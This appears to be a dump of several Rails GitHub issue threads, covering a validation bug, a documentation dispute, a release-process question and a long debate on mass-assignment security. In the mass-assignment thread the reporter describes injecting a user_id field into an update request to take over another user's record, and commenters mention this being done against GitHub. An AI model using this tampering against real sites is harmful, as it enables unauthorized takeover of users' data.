you say, handling it on our side is independent of that.  Even just sticking a  in there seems fine. Either way this should be a very small change, just needs a test. @friend Were you interested in opening a PR for this?  Sorry, hadn't had the time because i was thinking I'd have to set up a whole local dev env to do the change and test it, but it's so small and I figured you guys probably have some sort of CI anyways so I just did it in the web UI.  @friend we do have a CI but there isn't a test testing the case you changed, i.e. the case where a load path is nil. We can't accept a change without a test because then someone can come along and say the same thing ""just a small change, the suite passes, remove the "" and then your case will be broken again. The test is prevent regressions, not because we think this change is too dangerous.  @friend nah I totally get it, I just don't have a dev env set up for Rails and I figured that was gonna take a decent amount of time... I've been in serious crunch mode trying to ship something. But I just looked at the dev setup instructions and it looks really simple so I'll give it an hour right now and see where get.  @friend is there a Docker image for the dev env? I'm wary to install Virtual Box because I know it's had conflicts with Docker in the past and I really can't break my work env right now.  If you're on a mac I recommend doing it ""the hard way"" which really isn't that time consuming. You can probably skip setting up active record so as long as you have a supported Ruby installation shouldn't be much more involved than starting a rails app. We don't have a docker image that I'm aware of. I totally understand if you don't have time to work on the issue. Open source is time consuming! I wanted to explain why we can't merge the PR as is 😀 If you run into an issue setting up locally let me know  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",20,2,455,0,0,129,7,
rails/rails/31437,0.108205043,rails,rails,Rails 5.1.4 Belongs_to validation,5917,41,44,0,2,"If child association will fail on its validation rules then I receive ActiveRecordNotNullViolation after parent save In this case, belongs_to validation doesn't work  I tried but couldn't reproduce the issue, can you please try to provide an executable reproduction script by using the information given in this page?  frozen_string_literal true begin   require ""bundler/inline"" rescue LoadError =&gt; e   $stderr.puts ""Bundler version 1.10 or later is required. Please update your Bundler""   raise e end gemfile(true) do   source "" { |repo| "" } Activate the gem you are reporting the issue against. gem ""activerecord"", ""5.1.4""   gem ""sqlite3"" end require ""active_record"" require ""minitest/autorun"" require ""logger"" Ensure backward compatibility with Minitest 4 MinitestTest = MiniTestUnitTestCase unless defined?(MinitestTest) This connection will do for database-independent bug reports. ActiveRecordBase.establish_connection(adapter ""sqlite3"", database ""memory"") ActiveRecordBase.logger = Logger.new(STDOUT) ActiveRecordSchema.define do   create_table companies, force true do |t|     t.string name   end create_table owners, force true do |t|     t.references company, foreign_key true, null =&gt; false   end end class Company &lt; ActiveRecordBase   validates name, presence true, length { in 2..4 } end class Owner &lt; ActiveRecordBase   belongs_to company end class BugTest &lt; MinitestTest   def test_association_stuff     owner = Owner.new     owner.company = Company.new( { name ""too long name"" } )     owner.save   end end  There is no issue with rails. If you try with  option in your owner model it works. But why? The thing is if you don't set  to true then Active Record does not try to save the company relation and since you have not null constraint in your database it raises the exception. What happens when you set  to true is, Active Record tries to save relation but first checks the validations and because of the validation error it rolls back.  I can't agree with your answer... If Company model data will be correct (name length in 2..4) then company will be saved (without this option). belongs_to property (without optional flag) should care that relationship exists, without raising exception on database level! According to documentatin, autosave flag is for different purpose (for saving in update action).  This is from the documentation, which means no matter whether its an update or insert or delete. But here I see that there is an issue with the rails in autosave module. Since the owner belongs to company while saving owner the company should be saved as well so this is what Active Record is trying to do. By default rails saves associated records if they are new records even though the autosave option is not set, kind of an implicit autosave. If you want a workaround you can set  to true till this issue is getting fixed.  Without  flag company is also saved (as you said - implicit save). In my opinion autosave = true should be as default option. When autosave = false, relationship shouldnt be saved. I really don't know why (without autosave option) model is not validated (because autosave is implicitly)?  With or without autosave the parent model is validated. The only difference is when autosave option set as true, the validation failures rollback the transaction. If it's not set, it just ignores the validation error on parent model and tries to save object. As far as I see from the code and test cases, this was done in purpose which does not make sense to me. If the relation is , parent record validation should rollback the entire transaction, otherwise it leads to data integrity issues. In your case since you have not null constraint in database layer, database saves your life but the application itself should have this protection as well. I'll try to fix this behaviour but I can't guarantee it will be merged since I don't know what the Rails team will think and this is kind of a breaking change.  Yes, I fully agreed with you. Database exceptions should be the last way for keeping data consistency ) Thanks for your support. Please update this topic if you will have any news about this.  and?  Sorry I was on vacation therefore couldn't find time to have a look at this. Maybe someone from Rails core team can give some opinion about the issue. \cc @friend  and what do Rails team think? We spent some time to investigate and will be stupid to allow to this subject  This is not an issue. Please close.  not issue, really? Please explain.  @friend   and ??  @friend  and ?  Please can you avoid bumping the issue. Rails is made by volunteers and they usually work in work they are interested. If this issue is so important to you please do investigate a try to open a pull request with the fix.  I asked why not issue, so is it or not? One volunteer confirmed that sth is wrong and why should I forget about it?  I already said there is a problem and mentioned one of the Rails members. Since the issue is not closed by one of them, you can assume that they recognize this as an issue so there is nothing you can do other than waiting for some one to take a stab on the issue or you can come up with a pull request to address the problem. Actually the second option is better than harassing people through a platform where people try to help each other. If you can't come up with a fix, please at least stop pinging the issue, this kind of attitude(it's really annoying to me) does not help, it contrarily keeps away people from involving with the issue.  This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",29,1,221,0,0,123,13,
rails/rails/33009,0.0931965475,rails,rails,Documentation issue,8788,121,47,0,4,"I'm trying to learn about how to enqueue jobs into Rails as a ""background"" task, and the documentation on this topis is really not clear. Maybe someone can help me, and help update the docs. From here  What file should that function go into? Does it get called when the server starts? When does it get called? I want a function that will get called when the server starts. How do I do that? Yep, that's exactly what I want. How do I use the ""in-process"" queuing system to start a function that will run in RAM? There is no detail about that in the docs, it appears. I would like to not have to call every one of my ""background"" processes by hand when I start my server...  Please use StackOverflow for questions/help, where a wider community will be able to help you. We reserve the issues tracker for issues only.  StackOverflow is a really, really horrible forum. Is this a joke? Basic functionality questions are not allowed? The issue is about your documentation and the fact that it doesn't answer BASIC USER QUESTIONS!  The fact that you guys offer no help at all and just force close issues is really upsetting. Horrible moderatorship, horrible repo maintenance, honestly.  I don't think rafaelfranca should be moderating here. I'd ask a more senior member to step in and help, please.  Feel free to improve the documentation. Rails is made by volunteer efforts. Some times the documentation will not answer some questions. Some times those questions don't belongs to the documentation. There are plenty of books that could answer your questions. The first questions are basic, I agree and the answer for them are Any file were you need to schedule a job. It could be in a controller, in a model, in an initializer, in a library, etc. It depends on where you put it. If you put in an initializer it will run after the application initializes. I think I answered that question above.  and make sure you are using the right job adapter. Your questions are about usage of the Ruby on Rails framework, and looks like you missing some knowledge about how rails works. I can point to you some other pages in the guides that could help you to build the knowledge to come up with the answers for those questions by yourself.  you think this should be in the documentation, please do investigate and contribute back. Now for the second set of questions No. And I'll explain in the next answer. It is not. As you can see in the Contributing file that GitHub linked to you before you opened the issue, questions about Ruby on Rails usage are not allowed on the issue tracker. We have different forums for that. One of them in Stack Overflow. If you don't like it you can use the rails-talk mailing list linked in the contributing file. I don't think this is a documentation problem, but indeed it doesn't answer all basic user questions since it can't. It is a best effort. It can answer some of the questions but some questions it will have to expect users to be able to look on other sources like books, blog posts and other guides pages in order to build the knowledge that is missing to understand how to use it. That is also your opinion and you are entitled to have it, but also consider that, like I said above, Rails is made by volunteers, and by a limited number of people. If we would be answering basic user questions for everyone that have them, neither if that was our full time job it would be possible to be able to help everyone. This is why we direct people to other forums like Stack Overflow where a wider community can be able to help. Last, but not least, as per our license THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED. Even that my colleagues locked the conversations because they do think your comments were too heated, I'll unlock in case you want to rethink your attitude and, given all information and reasons that I gave you to close this issue, you want to suggest improvements.  Although @friend was a bit aggressive, I do agree with his opinion on StackOverflow.  SO usually is toxic and rarely does it provide meaningful feedback which could help with a complex issue (e.g I've been facing rather strange issue with Rails 5.2 after updating from 5.1.4 and I wasn't able to get any feedback on it on SO or the mailing list, but I won't go into details here and instead will keep waiting and researching). The mailing list is also rather empty and I doubt many people actually read it. I do love the IRC channel but at times it's hard to keep track of a conversation. In comparison to the Elixir community, I feel like it's harder to get help and feedback on the issues you're facing with Rails. I'd love to see an equivalent of the elixirforum for our community. But anyways, we all love and appreciate all the effort and time put into Rails, the ruby ecosystem, and our somewhat-loving community, by awesome volunteers like you, @friend.  That is a valid point @friend. I think we as a community can improve the level of support, but I really believe that GitHub is not the right place for questions about usage of software, and waiting to core member to reply those questions doesn't scale. Food for thought why the mailing list is empty and people don't read it? Would introducing a forum improve the participation? My guess the problem lays on the answers for the first question. We as a community should use the appropriated forums to help newcomers, answer questions, help each other. That responsibility is mine, yours and of everyone that is part of this community. So, if the mailing list is empty, let's fill it. If nobody reads it, let's read and reply to set the example. If people don't provide meaningful help, let's be the ones that will. As someone that had all this support when started to use rails I really believe it is possible and it doesn't require a team of 12 people to be the only ones providing this support.  HOW??? HOW DO I ""ENQUEUE"" JOBS??? For the love of god, people. Just giving me a function prototype and telling me ""put it anywhere"" doesn't help. Why don't I use the mailing list? Because it's not anonymous. Same problem with IRC, it's really painful to use without giving up your IP address and network route. Plus, I really and truly BELIEVE that GITHUB is the place for user questions related to a repo! Why? Because it archives, and because you actually interface with the devs responsible for the project.  I guess I'll just keep searching and trying and trying whatever random stuff I find. I'm trying to start a socket monitor with the server, parse and broadcast socket messages. I want it to automatically start with the server, and run basically like a daemon. If it dies, it would be nice it it comes back to life, eventually. If anyone can offer some advise over where to look, I'd appreciate it. I can't make heads or tails of the official documentation about the ""queue"" system. It seems to indicate there is some way to put jobs in some sort of queue, but it's not real clear on HOW.  Here's an unanswered thread on StackOverflow. I added my question there and the mods promptly deleted it. Great.  I think I need something more like this  I think that one page about how the ""enqueue"" jobs is just super-confusing and threw me for a loop, sorry.  @friend That's indeed true and I agree. Hard to say, I read the mailing list whenever I get a notification but most of the time I do not have an answer to the question or issue that the user is having, so in the back of my mind I just say ""Someone else will handle it"". I think this ""someone else will do it"" approach is an issue and I know that I'm not the only one that does it, unfortunately. I also believe that the mailing list is rather dull looking, and as we know, fancy stuff make people want to get involved most of the time. @friend Quite the opposite, I believe that section of the documentation does what it's supposed to do. It explains how to enque the job. And the section below it explains how to execute the jobs, which I believe is what you were looking for. In all honesty, I think you need to relax a bit and not be so aggressive.  Issues can be frustrating but it does no good to be mean to people.  Also, in regards to the user docs, they need work. The section on ""queueing"" is really, really confusing. I was looking for how to make a process run at startup, and run basically as a daemon, and that page threw me for a complete loop. It needs to include detail on how to actually make processes run on a desired schedule, not just at some nebulous ""time in the future"".  You are fine to disagree, but your aggressiveness, even though, I respectfully unlock the conversation so we could actually have a discussion with respect, actually bought you a permanent ban of the rails issue tracker. Enjoy! ",42,17,266,0,0,299,20,
rails/rails/33517,0.12999165699999998,rails,rails,Q about your release strategy (no bug),2172,30,15,0,2,"Do you have rules before releasing a new version of ruby/rails, for example ""no more than x bugs"" or ""no critical bugs"" or so? Can I read them somewhere? If you do not have such rules, do you need some help setting up this quality assurance stuff - I could help with that if you like. I think it's more important to publish something stable instead of something fast.  We publish release candidates before any release to catch any regressions as soon as possible. E.g. for the coming 5.2.1, we've just released rc1  is always appreciated, but I don't think we need any for the process setup here. Thanks!  Where can i see details about your regression tests?  You can see our test matrix in Travis CI here  notice that there are very few tests that are run on JRuby, and even those are marked as ""allowed failures"". Latest Rails is not currently expected to run on JRuby, and while improving that would be nice, it's not a release blocker. The JRuby team are doing great work, within their available time, to bridge that gap -- and once it works, we'll prioritise keeping it working -- but until then, the problem is that JRuby isn't acting enough like Real Ruby; we can't fix that. If you want to see Rails running on JRuby, I'd suggest speaking to the JRuby and/or activerecord-jdbc-adapter teams they'll have a much better idea of which Rails version they have the best support for at the moment.  a) Why do you not try to code as compatible as possible to jruby?  b) Do you have any release strategies for QA I can read? As mentioned before , something like ""no release if x bugs left"" or ""no release if critical bugs available"" or so? c) I work in my free time on similar things, too (others) and I know that no one can expect anything, I have only positive impulses and good ideas, a mental attitude to bring things positive forward. d) Quality for a framework is more important than the next release with n bugs left. The best mix for that can be calculated with a nash equilibrium formula.  I do not understand why you not try to be compatible to the java world, your rails apps could work on apache tomcat or many government contractors allow only java bytecode. ",13,0,75,0,0,48,7,
rails/rails/5228,0.214717915,rails,rails,Mass assignment vulnerability - how to force dev. define attr_accesible?,42102,438,357,0,12,"Those who don't know methods attr_accesible / protected - check that article out  view at typical situation - middle level rails developer builds website for customer, w/o any special protections in model(Yeah! they don't write it! I have asked few my friends - they dont!) Next, people use this website but if any of them has an idea that developer didnt specify ""attr_accesible"" - hacker can just add an http field in params, e.g. we have pursue's name edition. POST request at pursues#update id = 333 (target's pursues id) pursue['name'] = 'my purses name' pursue['user_id'] = 412(hacker id) if code is scaffolded than likely we got Pursue.find(params[id]).update_attributes(params[pursue]) in the controller. And that is what I worry about. After execution that POST we got hacker owning target's pursue! I don't mean that it is Rails problem, of course not. But let's get it real(Getting Real ok) - most of developers are middle/junior level and most of them don't write important but not very neccessary things tests, role checks etc including topic - attr_accesible how to avoid injections ? What should Rails framework do to force people to keep their rails websites safe? Making attr_accesible necessary field in model? What do you think guys.  I was thinking about generating something like this, unless you pass some kind of option to generator (sometimes you just want to skip  if you know what you're doing)  @friend pointed me to #4062, there is a config setting that can do something like that . Although, based on that discussion I think that the consensus is that it should not be the default.  so, here is what i came up to.  My main concern - is relations.  I hate the idea that some people could rewrite object references by themselves. Nobody should be able to set task[user_id]=hacker_id or sort of Vulnerable references are the main evil because 1) it totally ruins database and leaves no way to fix it back but backups 2) it works clearly. Hacked user won't be able to figure out ""Where is my blog post"" or ""How come this spam post is in my timeline written by me"" (if newpost[user_id]=target_user_to_hack) I suggest to have foreign keys and primary keys protected by default(what are keys can be recognized by ActiveRecord easily). IMO Rails should teach developers to set up so important and vulnerable keys by hands. It is not a handicap for prototyping, just +a few lines of code. But it is all about sane and safe rails apps. I've got a big picture in my head but the backbone is described above. I strongly believe that having keys(references, relations) will make ruby on rails a 20% more awesome. I mean robust  Oh, didn't mention. On my part - I wouldn't support setting all attrs protected. It will cause such big mess! You cannot force every body to read release notes. Stackoverflow will be down. ] + it is dirty solution.  What also we have in model but keys? E.g.  title string  - not vulnerable at all, user is able to edit his comment rating integer - pretty vulnerable but not dangerous account integer - developer who left user[account] open for mass assignment should suffer. Nevermind about him. what else? Do we really need protected fields by default? No.  @friend you dont like 'whitelist' idea - i dont too. But what is your opinion regards relation keys? They are obviously should be defined manually - in most cases. That is why having them protected by default is not a big deal.  And, surely, it should be opt-out-able, e.g.  config.active_record.protect_keys = true  Just imagine which power this vulnerability gives in my.. and now in your hands if you get what has happened.  @friend @friend  Y you no care trollface  There're too much trolling going on in this ticket and I'm not sure anymore if you mean anything serious. If you're going to do a bug report or feature request, just stop trolling and try not to be annoying, then the core team will come and check out by themselves. Name calling while trolling doesn't help, trust me.  @friend bugs are serious. This is not only bug report, because this problem is so wide spreaded. postereous, speakerdeck, scribd, github - and I only have started testing. We need to introduce blacklist attributes. MOst of rails apps(from small to github) likely got mass-assignment bugs if they don't user attr_accessible. I just want to attract more attention to reviewing this problem from scratch and calmly decide - what should we do with M As-ment problem. And, if some of you support my idea I could provide fixing pull request. But you ignore this bug, like nothing has happened for a long time. SOrry for not called for trolling, I overplayed ) Everyone, again, express your point please, you are welcome.  There was a proposal about changing that flag in #4062 and the consensus is the pros of the default configuration outweigh the pros of the alternative. Thanks!  @friend have you read my post? Did you see vulnerabilities i pointed out in e.g. github? It is not about the flag in configuration, I'm pretty certain. We need to have created_at, updated_at, and references to be protected by default. Whitelist issue has nothing to do with my point Please read issues carefully, because I clearly emphysized that flag is not a panacea  What I want you to see in that thread I mentioned is the way the core team perceives this. You are not discovering anything unknown, we already know this stuff and we like attr protection to work the way it is.  look. this is github, written on rails.   as you see github is vulnerable. Because gh devs are bad? Or who's in charge? Rails are in charge, and blacklist of custom [created_ate, updated_at] is the least we MUST do Really, is there any case when user should be able set created_at by himself? It is timestamp! Why I can set it using just &lt;input name=model[created_at] value='1987...' ?  Again, let's talk about certain vulnerability-case. created_at MUST be protected by default. Am i right?  Rails is not in charge, it is your responsibility to secure your application. It is your responsibility to avoid XSS, to ensure that the user is editing a resource that belongs to him, etc. Rails, however, does a lot of effort to assist you in securing your application as much as it can. That's why you have some protection measures built-in. I don't think we need to special-case anything. The user has a flag to secure by default, I personally think that is enough. I see little benefit in special-casing the timestamps if you have the flag set to false. And I am totally -1 in doing anything fancy with foreign keys because they have of course valid use cases where users can set them.  Perfect response. Rails are not in charge - my question was like, 'why is that'. Surely nobody is fully in charge. But only rails apps got this kind of bug. Yeah, phpists never got so fast prototyping tools so most of them cannot even dream about update_attributes {} and form generation too. Rails has very convinient tools, I agree! attr_accessible is good and must thing for every developer. But for now we got it too unknown. Most of middle level developers forget about the meaning of this tool. Mixes with attr_accessors in ruby itself - so their model gets very unsecure. So you only a little bit support special casing of timestamp.  For first view at the problem of timestamp-overwriting it doesn't seem fatal. But when I have issue/comment written in 3012 year I at least have it number 1 in any timeline orders. That seems ugly to me so I am keen to special case timestamps. Regards foreign keys - I  didn't get why you are ""totally"" -1, and if you got spare time please give me valid use cases if you know some. That will help me in understanding your point fully another way to decide problem - populate using of accessible. Include it in scaffold generated output for model files. Im  pretty sure rubyists will care much more having these lines and one day 4/5 will know+use this declaration. (now 4/5 don't either know or use, that's sad)  @friend I also don't like the idea of doing anything automated with foreign keys or timestamps. That way, people that does not know that they need to use some kind of params protection will be secure in those 2 cases, but it will fail with any other critical field, let's say . @friend what do you think about generating a model class with a comment describing attr_accessible and giving example, something like  @friend  it is your viewpoint. Ok, let's not bother junior devs who will need to think about protection.  But I like your proposal regards model generator. I suggested it as an alternative, this fix will satisfy me. )  It's 2012. When will people stop believing in ""blacklists""? The default has to be restrictive and the developer has to make sure she/he does acceptable exceptions. It's like with the XSS/sanitize stuff. It will never work the ""blacklist""/""developer should care"" way, imho. At least throw a warning into the debug-log when a model has no attr_accessible defined at all...  @friend Is this how you added  curious.  @friend plus one Rails is all about conventions. Broken by default is not a good convention.  @friend Man, you look like a kid that wants some attention. Stop trolling and make GitHub a favor — file a private bug request via contact form — that's how non-douchebag people do. I totally agree with @friend — missing  is not Rails' fault but developer's mistake. Generated models could have a friendly comment like @friend said, but in practice I think we don't use generators that much, I thought that's easier just to type .  @friend don't shoot the messenger, dude.  @friend what you say? Every book, every tutorial, every guide tells developers to use generators. Do you create all the test + migration files by hand?!  @friend I might have a bit overreacted — apologies for that. Yet I think giving one example of vulnerability is enough, no need to go through commits and issues over and over screwing things up.  @friend is right, though. Zero-day attacks are a completely inappropriate way of raising awareness of a vulnerability.  @friend I use generators on prototyping stage extensively, but then it simply gets too custom and often beyond scaffolds. It depends on a dev though.  @friend it's primarily a model issue, not a scaffolding issue. attr_accessor is defined inside a model, not in a controller. 100% of all developers I've worked since 2007 use generators to create models + migrations.  Two security issues concern me about Rails 1) The defaults not being restrictive 2) Lack of any certification for Gem distribution (imagine if someone got a commit in to some of the most popular gems)  @friend rubygems does not even have a popular self-signing implementation as most cpan modules (perl) use. So you can't be sure the gem you've downloaded is the one the author made (not the CIA or another MITM).  1.77 was released iirc around 2002/2003)  @friend RubyGems supports gem signing, I use it for a client of mine  the other hand, 99.999% of gems don't use it -)  @friend iirc only when explicitly specified on the cli (what about bundler?) and as you said....""not very well"" adopted.  In this thread core rails devs get egg on their faces for ignoring a fundamental security concern, and then proceed to complain when the reporter 0days GitHub.  Rails devs are not responsible for Rails-powered sites. It's not their fault.  See  for my proposal for how to improve the situation.  @friend I don't think that's completely correct, the fix presented in this issue is exactly what the Rails core devs could do, to assist the novice Rails devs. Convention over Configuration means that the Rails devs are actually partially responsible for Rails-powered sites because they establish the convention.  @friend Proposal for Improving Mass Assignment -  @friend A framework's responsibility is to help programmers write better quality applications.  Not to mention that  shouldn't be in model...  It's a worrying issue, made all the more worrying in that I had no idea it existed. I know that the Rails Guys don't see this as a big deal, but I'd ask them to reconsider. This issue affects a lot of projects. I've added ""disable_mass_assignment"" as per the following link and I'm updating my codebase. FWIW, it's a pretty quick job to search for affected fields and add them to the model.  not 100% sure what the ramifications are for models which have different rights according to a user level, but I'll be investigating. One Quick Suggestion  When Attr_Accessible is switched on, the error you get looks something like ... ""Can't mass-assign protected attributes email, name"" Maybe this could be changed to   "" Can't mass-assign protected attributes email, name Add following to your model ( to allow these to be edited in forms Attr_Accessible email, name "" I believe the code to protect the fields should be in the model. I think model attributes should come with security baked in. Not 100% sure how this would work, but it makes the most sense to me.  From homakov ""@friend @friend Y you no care"" Does this guy have to send a teddy bear &amp; flowers? If someone tells me ""Hey you got a severe hole in your app"", and I ignore him, and that hole is then exploited by Anyone (him included), I am to blame.  Someone who cracks my app is an ""a$$hole"", but if they tell me first, and then only crack it to illustrate their point... no.  I am wrong.  @friend his ticket has not been ignored, hasn't it. We disagree about his proposal, which is different. Rails applications have a configuration flag that forces you to declare accessible attributes, the support to prevent these kind of issues is builtin.  Bravo to @friend! What's the shame! When 90% rails apps in the world are vulnerable, ""core team"" says ""We disagree about his proposal"". I have just one question is this framework for ruby developers or only for such ""professionals"" from ""core team""? Open source is so open source in this project...  @friend this proposal would not automagically fix any existing app - it's up to developer to say which fields are protected, there is no easy way to guess that. This can be a problem in all frameworks that allow mass assignment. That said, I'm sure that this needs some farther discussion, but automagically fixing some fields is not an answer and will just not work in practice.  Also, for what it's worth, I proposed a temp solution to raise awareness by adding comments to generated models, to which @friend responded ""1 day ago""  Dear Rails people, Have you learned nothing? ""Insecure-by-default"" means ""insecure"". Trusting the programmer to fix things up and make them secure has never worked. You guys have reinvented strcpy(). Way to go.  @friend in my opinion, if you don't know how can you handle this automatically, force developer to choose correct option. With current defaults, developer sees ""ok, everything works fine"", and he won't read next chapter about security, he doesn't understand how dangerous can it be! Every wi-fi router after you entered predefined password says ""it's dangeous to use predefined password"", when you login to some admin console with predefined password it says ""You are using default password. Please change it."". You aren't warn that it's dangerous. I believe the problem is the bug was closed after your comment and no new one is created. I think you would like to bury it under show, but thanksfully @friend done the thing that won't be forgotten for a long time ;)  @friend seriously? please don't create any conspiracy theories. The first closed/open thing was done by accident, I reopened ticket seconds later.  For what it's worth, I have commented about this ticket at  @friend ok, sorry, I didn't notice that you're reffering to the other issue, not this one, frankly I missed the magical reopening. I passed it to github guys and closed as was not adding anything into discussion - @friend proved that github is vulnerable and it's referenced here.  @friend wasn't trolling. It's a language barrier filled with relating to memes. His intentions were pure and good. Maybe didn't solve it the best way, but he got the attention and now a proper response. @friend solution is a great one.  Nobody here sees the irony in Rails redoing what PHP was ridiculed for for so long? Never. inject. user. input. by. default.  Imo this whole (mass) assignment protectecion does not belong to the model at all, it's a controller thing. I already created an issue for this months ago  github owes @friend an apology. a proper one. and the ones who tried to dismiss him because he doesn't write proper english, should do it in russian.  Nice one @friend Well pointed. GitHub jeez, unblock the man's account!  We should actually be grateful to @friend for bringing this known but not sufficiently addressed problem to attention. Rails should of course be secure by default. Analogous to the XSS situationwe should not allow an insecure (tainted) params hash to be passed straight into our db API, thats almost as bad as being open to SQL injection. The whitelisting/filtering belongs in the controller. Since both @friend and @friend seem to share this view there is a good chance we will get a proper fix in Rails soon.  The entire idea of Rails is to make an application extremely hard to hack even when the programmer has little to none security expertise. Expecting people to fix this themselves is plain silly and goes against the rails way in my opinion. IMO, the entire mass assignment idea should not exist - its way to dangerous and and has no room for error.  @friend I thought the entire idea of rails was to make it easier to build applications, to focus on what your application actually does without having to worry so much about how it does it (at the lowest levels, at least). There's an entire guide explaining how to secure that application once you've built it (or even while you're building it). I agree that certain things (like mass-assignment security) should be enabled by default, but I wouldn't go as far as to say that's the ""entire"" idea of Rails.  @friend True - but with one comes the other. Applications get easier to build when you do not have to invest so much time into securing your applications. Rails is also forcing people to think with a certain mindset (which makes you a better programmer in the end). Junior/mid-class developers see that something works with Rails and they think that's it. When you force mass-assignment security - they realize their code is not working and must assign the attributes - you force them to think about security. Starting rails developers should not learn about these issues by having their entire project exploited IMO. Perhaps its not the entire idea of Rails - but Rails already got so much out of the box security build in its certainly a very big part of it.  this is an interesting ticket, it's like ""close the security hole"" ""no, we want developers to close it themselves"" and then they continue calling it a philosophical disagreement after the bug tracker itself is hacked  @friend Oh, I agree, I just wouldn't go as far as saying that's the entire idea of Rails. Personally, I think the best solution would be to immediately release an update that takes one of the approaches given in the first two comments by @friend on this ticket. Either set attr_accessible to nil on ActiveRecordBase or set config.active_record.whitelist_attributes to true by default. Either of these forces safe and sane mass-assignment by ""breaking"" the app if your models aren't safe. I put ""breaking"" in quotes because, realistically, if this one change causes any kind of breakage in your app then it was already broken anyway.  Hmm can someone summarize the discussion? Did anybody agree on something?  When I first saw , I already knew it's vulnerable and nobody should write like that. However, this approach is widely used in all Rails guides, and so insecure. Mass-assignment should be disabled by default.  -1 to response from rails team.  @friend Java-based frameworks are not the answer. They can be pwned too. Take any Jersey app with Spring integration and do the same thing. The only difference is you may have to work a little harder at guessing some of the attributes. I think it's funny that junior/mid-level programmers are being called out so much in this thread. Surely the engineers at GH are not all junior/mid-level guys. Maybe they are and I am just naïve.  I do not think mass-assignment should be disabled by default, but must be disabled on production environment by default. I think this is a good compromissum between developer needs and production security. About filtering what @friend suggested, I think some similar. First, there is need a way to instruct the framework to filter it by default then it needed to be enabled in production mode. I understand every developer is responsible for its stuff but I do not agree why Rails does not help for make its application more secure. Rails is designed with some security solutions, like CSRF stuff and basic protections against XSS. I do not think why we cannot do more step on that way, and make models secure by default. If it is planned well and configured well, then it should not be a pain in the ass. Who needs the original function, they can disable this feature.  @friend my comment above is not fully accurate. I should have said, ""Take any Jersey app with Spring integration where the services interact directly with the entities..."" I have seen many Java programmers do it.  It was forced! 6dd6816ce337322e7c267ab1158ac8c80588ccd6  THIS  Protecting attributes from within controllers sounds like a setup to have multiple points of fault.  If I have more than one controller making saves/updates on the same model (ignoring a debate over if that is good design), then I have to remember to protect attributes in multiple controllers.  If I handle mass assignment from the model, there's a single, definitive barrier between submitted params and persistence, irrespective of where that data originated.  @friend exactly. That's what I tried to say dhh in my gist. Controller has nothing to do with unintended params. It doesnt filter. It handles, manages, controls business logic.  IMO You should write your controllers way described below 1) have all critical fields protected/updateable - accessible 2) control saving new record in controller using role checks, dependencies and abilities. Not just by filtering user_id 3) Never simplify business logic for ""update"". People got role checks in ""create"" but trying to manage just ""update_attributes"" in edit and that's why this has happened. If you check role - check it on create and on update. Don't be lazy. sic!  @friend I see your price-list updated on your site D. With you are skills and rails knowledge, you are asking for a junior dev salary in us.  @friend, what if you protect those attributes in , which all other controller inherit from? This would allow you to still set all attributes in your test cases, and you would protect against having multiple points of failure.  Probably you can make a branch like ""rails_for_developers_that_doesnt_read_documentation"" and in that branch you can take off update_attributes, and there you will have a ""secure"" rails framework for people complaining about this issue )  @friend plus one Exactly what I thought. This is a new register_globals. Unbelievable.  FWIW, this behavior isn't unique to Rails.  Or, to be more specific, it isn't unique to ActiveRecord.  If you were to look at other ORMs/ODMs, such as DataMapper, Sequel, MongoMapper, or Mongoid, you could see that mass assignment was allowed by default on any given model, and can be adjusted using a whitelist (or sometimes a blacklist) class method. I don't see anything wrong with this per se.  To disallow mass assignment by default would be a safer default, but it also makes the assumption on what you're doing in your application, and what does and doesn't need to be secured from user tampering.  But it also requires you to be aware of the potential security concern to begin with and be thoughtful of it when designing your models.  @friend If somebody develops an application what will be available from internet for a wide publicity, then it must be protected on all way. I wouldn't like point to GitHub issue what happens if application is not protected. You cannot trust in the internet. If you are a beginner, then read the f_ing manual to yourself, and again, and again, until you understood the security is not an option, but a requirement for your application. I understand some ORMs does not enforce this security setting by default but this page is not an issue page for Mongoid, Sequel, or DataMapper, but it is an issue page for Rails, or to be more specific, for ActiveRecord.. If other ORMs decide make a possible security hole on a non-careful developer's code, then this is their own decision, not the rails developers' one.  Because somebody decides he jumping from the rock without a rope, we do not need to follow that example. We can attach ourself to a rope, and we currently doing it.  There was one problem with this option it wasn't promoted enough. I never saw this option in the generated default config files, and if this (and GitHub) issue does not points me to it, I never set it, even if I use  in my applications. Promoting the security is a very high priority communication job, if there is one channel where we can do it, we need to do it.  @friend You can't protect the user from everything. Having all attributes blacklisted is arguably a safer default, as I said.  It nonetheless makes assumptions about the application.  There might be no need for certain applications (which might not even necessarily be ""web apps"" per se) to have all attributes blacklisted by default.  Some users might even find such a default more burdensome than helpful, depending on what their use case is. The irony of your ""read the f_ing manual"" statement is that the lack thereof is part of the problem here.  Users aren't protecting their attributes either out of ignorance or oversight.  And to be fair, maybe the vulnerability isn't stressed enough in the documentation.  (I haven't looked.)  I'm not arguing against trying to mitigate potential disaster -- I'm all for it -- but I would also argue that if one doesn't truly understand why mass assignment is disabled by default, then he or she is liable to make their models insecure no matter what. And for the users who are truly oblivious, here's what's going to happen anyway ""I can't set  from this form.  Let me just add  to the  array, because that's what will make this action work the way I want it to."" That user doesn't understand what  is for, why they'd want to whitelist attributes, why they need to whitelist attributes, and what can happen if they whitelist the wrong attributes.  They might not even understand that they are whitelisting attributes -- they might think  is some kind of riff on  that adds getters and setters based on their schema. At best, we're really just going to make it a little more difficult for them to screw themselves.  Defaulting to a blacklist is an improvement to security, but no panacea.  And I guess that's what I was getting at in my previous posts.  It seems like some people are mindblown by all this, like allowing you to protect your attributes but not doing it by default is just nuts.  We can go ahead and improve it, but there's still a dozen other gotchas awaiting the unprepared developer.  @friend To be fair, this sorcery also made assumptions for all our Rails apps (for security reasons) 9415935902f120a9bac0bfce7129725a0db38ed3 If you're going to do this (setting ) without knowing what it does, and you can't be arsed to look it up because you're too lazy, then you deserve to get ""hacked"". At this point, the average developer would look up what this does unless they already know, and understand what it's for. The first thing I pop in to the model when I create one is the  method, just to ensure I don't forget, because I likely will since I'm busy implementing other things. Even if you know it exists, like GitHub, apparently even skilled programmers get screwed by Rails' defaults. Thankfully @friend isn't an asshole, but assume he was, he could've done A LOT of damage with automated scripts to 